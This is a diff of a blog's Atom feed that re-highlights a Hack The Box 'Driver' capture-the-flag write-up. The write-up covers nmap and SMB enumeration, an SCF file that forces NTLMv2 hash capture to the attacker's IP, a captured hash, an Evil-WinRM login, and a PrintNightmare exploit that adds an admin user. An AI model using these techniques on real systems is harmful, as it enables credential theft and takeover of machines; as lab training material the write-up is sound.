@@ -4,7 +4,7 @@
   <generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator>
   <link href="https://darrynbrownfield.co.uk/author/darryn/feed.xml" rel="self" type="application/atom+xml" />
   <link href="https://darrynbrownfield.co.uk/" rel="alternate" type="text/html" />
-  <updated>2022-08-20T22:44:48+00:00</updated>
+  <updated>2022-08-20T22:50:57+00:00</updated>
   <id>https://darrynbrownfield.co.uk/author/darryn/feed.xml</id>
 
   
@@ -208,7 +208,7 @@ Archive:  flag.zip
 
 &lt;p&gt;I deployed the machine and was given the target IP 10.10.11.106. I started a NMAP scan to check the available ports.&lt;/p&gt;
 
-&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;└──╼ &lt;span class=&quot;nv&quot;&gt;$sudo&lt;/span&gt; nmap -sC -sV -oA nmap/initial 10.10.11.106
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;└──╼ &lt;span class=&quot;nv&quot;&gt;$sudo&lt;/span&gt; nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oA&lt;/span&gt; nmap/initial 10.10.11.106
 Starting Nmap 7.91 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2022-02-27 17:20 GMT
 Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.11.106
 Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.020s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
@@ -216,7 +216,7 @@ Not shown: 997 filtered ports
 PORT    STATE SERVICE      VERSION
 80/tcp  open  http         Microsoft IIS httpd 10.0
 | http-auth: 
-| HTTP/1.1 401 Unauthorized\x0D
+| HTTP/1.1 401 Unauthorized&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;0D
 |_  Basic &lt;span class=&quot;nv&quot;&gt;realm&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;MFP Firmware Update Center. Please enter password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;admin
 | http-methods: 
 |_  Potentially risky methods: TRACE
@@ -254,7 +254,7 @@ Nmap done: 1 IP address (1 host up) scanned in 51.89 seconds
 
 &lt;p&gt;I also ran a full port scan and found winrm to be open on port 5985.&lt;/p&gt;
 
-&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;└──╼ &lt;span class=&quot;nv&quot;&gt;$sudo&lt;/span&gt; nmap -p- -oA nmap/all_ports 10.10.11.106
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;└──╼ &lt;span class=&quot;nv&quot;&gt;$sudo&lt;/span&gt; nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oA&lt;/span&gt; nmap/all_ports 10.10.11.106
 Starting Nmap 7.91 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2022-02-27 17:25 GMT
 Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.11.106
 Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.026s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
@@ -272,10 +272,10 @@ PORT     STATE SERVICE
 
 &lt;p&gt;Before looking at the web service I tried enumerating SMB with various tools such as smbmap, smbclient and CrackMapExec however I had no joy.&lt;/p&gt;
 
-&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;└──╼ &lt;span class=&quot;nv&quot;&gt;$cme&lt;/span&gt; smb 10.10.11.106
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;└──╼ &lt;span class=&quot;nv&quot;&gt;$cme&lt;/span&gt; smb 10.10.11.106
 SMB         10.10.11.106    445    DRIVER           &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Windows 10 Enterprise 10240 x64 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;name:DRIVER&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;domain:DRIVER&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;signing:False&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SMBv1:True&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
 ┌─[daz@parrotos]─[~/Documents/HackTheBox/Driver]
-└──╼ &lt;span class=&quot;nv&quot;&gt;$smbmap&lt;/span&gt; -H 10.10.11.106
+└──╼ &lt;span class=&quot;nv&quot;&gt;$smbmap&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; 10.10.11.106
 &lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt; Authentication error on 10.10.11.106
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
@@ -303,10 +303,10 @@ SMB         10.10.11.106    445    DRIVER           &lt;span class=&quot;o&quot;
 
 &lt;p&gt;The first article that returned was from Penetration testing lab https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/. After reading the article I created the file test.scf using the example they provide and changed the IP to my VPN IP.&lt;/p&gt;
 
-&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;└──╼ &lt;span class=&quot;nv&quot;&gt;$cat&lt;/span&gt; test.scf 
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;└──╼ &lt;span class=&quot;nv&quot;&gt;$cat&lt;/span&gt; test.scf 
 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Shell]
 &lt;span class=&quot;nv&quot;&gt;Command&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;2
-&lt;span class=&quot;nv&quot;&gt;IconFile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;\\10.10.14.11\share\pentestlab.ico
+&lt;span class=&quot;nv&quot;&gt;IconFile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;10.10.14.11&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;hare&lt;span class=&quot;se&quot;&gt;\p&lt;/span&gt;entestlab.ico
 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Taskbar]
 &lt;span class=&quot;nv&quot;&gt;Command&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;ToggleDesktop
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
@@ -315,8 +315,8 @@ SMB         10.10.11.106    445    DRIVER           &lt;span class=&quot;o&quot;
 
 &lt;p&gt;Then uploaded the file using the web upload function and got a hit from responder&lt;/p&gt;
 
-&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;SMB] NTLMv2-SSP Client   : 10.10.11.106
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;SMB] NTLMv2-SSP Username : DRIVER\tony
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;SMB] NTLMv2-SSP Client   : 10.10.11.106
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;SMB] NTLMv2-SSP Username : DRIVER&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;ony
 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;SMB] NTLMv2-SSP Hash     : tony::DRIVER:87ea6d299d14fa32:ED6355EFB0444E974805B3FF0E0B9B26:0101000000000000803021AB042CD801AE67B0D5B0D050060000000002000800350054003400480001001E00570049004E002D0
 0350032003700430037004C004F004F0030004300360004003400570049004E002D00350032003700430037004C004F004F003000430036002E0035005400340048002E004C004F00430041004C000300140035005400340048002E004C004F004
 30041004C000500140035005400340048002E004C004F00430041004C0007000800803021AB042CD80106000400020000000800300030000000000000000000000000200000C974CDC12A32C5BFD81B375A1DECF3BF2FF300E27CB3440A6AC953C
@@ -327,26 +327,26 @@ SMB         10.10.11.106    445    DRIVER           &lt;span class=&quot;o&quot;
 
 &lt;p&gt;Now I had a username and password I was able to use winrm to login. To login I used &lt;a href=&quot;https://github.com/Hackplayers/evil-winrm&quot;&gt;Evil-WinRM&lt;/a&gt;.&lt;/p&gt;
 
-&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;└──╼ &lt;span class=&quot;nv&quot;&gt;$/&lt;/span&gt;opt/evil-winrm/evil-winrm.rb -u tony -i 10.10.11.106
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;└──╼ &lt;span class=&quot;nv&quot;&gt;$/&lt;/span&gt;opt/evil-winrm/evil-winrm.rb &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; tony &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; 10.10.11.106
 Enter Password: 
 
 Evil-WinRM shell v2.4
 
 Info: Establishing connection to remote endpoint
 
-&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;PS &lt;/span&gt;C:\Users\tony\Documents&amp;gt; 
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;ony&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; 
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;h3 id=&quot;priv-esc&quot;&gt;Priv Esc&lt;/h3&gt;
 
 &lt;p&gt;Now I had a foothold, I did some basic enumeration of the box. Looking at the running services I could see the Windows print spooler service.&lt;/p&gt;
 
-&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    381      23     5164      14448 ...12            1128 spoolsv
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    381      23     5164      14448 ...12            1128 spoolsv
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;This made me think of the PrintNightmare exploit. I could also have used rpcdump to find this.&lt;/p&gt;
 
-&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;└──╼ &lt;span class=&quot;nv&quot;&gt;$rpcdump&lt;/span&gt;.py 10.10.11.106 | egrep &lt;span class=&quot;s1&quot;&gt;'MS-RPRN|MS-PAR'&lt;/span&gt;
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;└──╼ &lt;span class=&quot;nv&quot;&gt;$rpcdump&lt;/span&gt;.py 10.10.11.106 | egrep &lt;span class=&quot;s1&quot;&gt;'MS-RPRN|MS-PAR'&lt;/span&gt;
 Protocol: &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;MS-PAR]: Print System Asynchronous Remote Protocol
 Protocol: &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;MS-RPRN]: Print System Remote Protocol 
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
@@ -355,7 +355,7 @@ Protocol: &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;MS-RPRN]: Print System R
 
 &lt;p&gt;I used git to clone the repo in to my /opt directory.&lt;/p&gt;
 
-&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;└──╼ &lt;span class=&quot;nv&quot;&gt;$sudo&lt;/span&gt; git clone https://github.com/calebstewart/CVE-2021-1675.git
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;└──╼ &lt;span class=&quot;nv&quot;&gt;$sudo&lt;/span&gt; git clone https://github.com/calebstewart/CVE-2021-1675.git
 Cloning into &lt;span class=&quot;s1&quot;&gt;'CVE-2021-1675'&lt;/span&gt;...
 remote: Enumerating objects: 40, &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
 remote: Counting objects: 100% &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;40/40&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
@@ -372,51 +372,51 @@ CVE-2021-1675.ps1  nightmare-dll  README.md
 
 &lt;p&gt;Now using Evil-WinRM I can upload the powershell script and execute it.&lt;/p&gt;
 
-&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;PS &lt;/span&gt;C:\Users\tony\Documents&amp;gt; upload /opt/CVE-2021-1675/CVE-2021-1675.ps1
-Info: Uploading /opt/CVE-2021-1675/CVE-2021-1675.ps1 to C:\Users\tony\Documents\CVE-2021-1675.ps1
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;ony&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; upload /opt/CVE-2021-1675/CVE-2021-1675.ps1
+Info: Uploading /opt/CVE-2021-1675/CVE-2021-1675.ps1 to C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;ony&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&lt;span class=&quot;se&quot;&gt;\C&lt;/span&gt;VE-2021-1675.ps1
 
                                                              
-&lt;span class=&quot;k&quot;&gt;Data&lt;/span&gt;: 238080 bytes of 238080 bytes copied
+Data: 238080 bytes of 238080 bytes copied
 
 Info: Upload successful!
 
-&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;PS &lt;/span&gt;C:\Users\tony\Documents&amp;gt; Import-Module C:\Users\tony\Documents\CVE-2021-1675.ps1
-&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;PS &lt;/span&gt;C:\Users\tony\Documents&amp;gt; Invoke-Nightmare
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] &lt;span class=&quot;k&quot;&gt;using &lt;/span&gt;default new user: adm1n
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] &lt;span class=&quot;k&quot;&gt;using &lt;/span&gt;default new password: P@ssw0rd
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] created payload at C:\Users\tony\AppData\Local\Temp\nightmare.dll
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] &lt;span class=&quot;k&quot;&gt;using &lt;/span&gt;pDriverPath &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_f66d9eed7e835e97\Amd64\mxdwdrv.dll&quot;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;ony&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; Import-Module C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;ony&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&lt;span class=&quot;se&quot;&gt;\C&lt;/span&gt;VE-2021-1675.ps1
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;ony&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; Invoke-Nightmare
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] using default new user: adm1n
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] using default new password: P@ssw0rd
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] created payload at C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;ony&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;ppData&lt;span class=&quot;se&quot;&gt;\L&lt;/span&gt;ocal&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;emp&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;ightmare.dll
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] using pDriverPath &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;C:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;indows&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ystem32&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;riverStore&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\F&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ileRepository&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;tprint.inf_amd64_f66d9eed7e835e97&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;md64&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;xdwdrv.dll&quot;&lt;/span&gt;
 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] added user  as &lt;span class=&quot;nb&quot;&gt;local &lt;/span&gt;administrator
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] deleting payload &lt;span class=&quot;k&quot;&gt;from &lt;/span&gt;C:\Users\tony\AppData\Local\Temp\nightmare.dll
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] deleting payload from C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;ony&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;ppData&lt;span class=&quot;se&quot;&gt;\L&lt;/span&gt;ocal&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;emp&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;ightmare.dll
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;It worked! I canceled my current WinRM session and logged back in using the new credentials.&lt;/p&gt;
 
-&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;PS &lt;/span&gt;C:\Users\tony\Documents&amp;gt; &lt;span class=&quot;k&quot;&gt;exit
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;ony&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; &lt;span class=&quot;nb&quot;&gt;exit
 
 &lt;/span&gt;Info: Exiting with code 0
 
 ┌─[daz@parrotos]─[~/Documents/HackTheBox/Driver]
-└──╼ &lt;span class=&quot;nv&quot;&gt;$/&lt;/span&gt;opt/evil-winrm/evil-winrm.rb -u adm1n -i 10.10.11.106
+└──╼ &lt;span class=&quot;nv&quot;&gt;$/&lt;/span&gt;opt/evil-winrm/evil-winrm.rb &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; adm1n &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; 10.10.11.106
 Enter Password: 
 
 Evil-WinRM shell v2.4
 
 Info: Establishing connection to remote endpoint
 
-&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;PS &lt;/span&gt;C:\Users\adm1n\Documents&amp;gt; &lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;C:/Users/Administrator/Desktop
-&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;PS &lt;/span&gt;C:\Users\Administrator\Desktop&amp;gt; &lt;span class=&quot;nb&quot;&gt;dir
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\a&lt;/span&gt;dm1n&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; &lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;C:/Users/Administrator/Desktop
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;dministrator&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop&amp;gt; dir
 
 
-    &lt;/span&gt;Directory: C:\Users\Administrator\Desktop
+    Directory: C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;dministrator&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop
 
 
 Mode                LastWriteTime         Length Name
-----                -------------         ------ ----
--ar---        2/26/2022   8:56 PM             34 root.txt
+&lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;                &lt;span class=&quot;nt&quot;&gt;-------------&lt;/span&gt;         &lt;span class=&quot;nt&quot;&gt;------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;-ar---&lt;/span&gt;        2/26/2022   8:56 PM             34 root.txt
 
 
-&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;PS &lt;/span&gt;C:\Users\Administrator\Desktop&amp;gt; &lt;span class=&quot;nb&quot;&gt;type &lt;/span&gt;root.txt
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;dministrator&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop&amp;gt; &lt;span class=&quot;nb&quot;&gt;type &lt;/span&gt;root.txt
 
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
